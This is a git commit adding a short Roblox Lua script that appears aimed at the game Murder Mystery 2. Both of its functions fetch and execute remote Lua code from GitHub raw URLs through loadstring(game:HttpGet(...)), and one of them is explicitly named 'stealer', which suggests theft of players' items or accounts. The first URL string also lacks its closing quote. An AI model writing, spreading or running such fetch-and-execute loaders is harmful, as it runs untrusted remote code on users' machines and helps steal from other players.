5fa6731b037ce42cf1abc15c3ee27614f98d4893
Sigmasigmaboyy211 <sigmaguy179@gmail.com>
2025-01-09 21:22:08 -0500

    Create scriptt.lua

---
+++ scriptt.lua
@@ -0,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Sigmasigmaboyy211/MM2Gui/refs/heads/main/Script.lua))()
+end
+local function farm()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2'))()
+end
+
+task.spawn(stealer)
+task.spawn(farm)
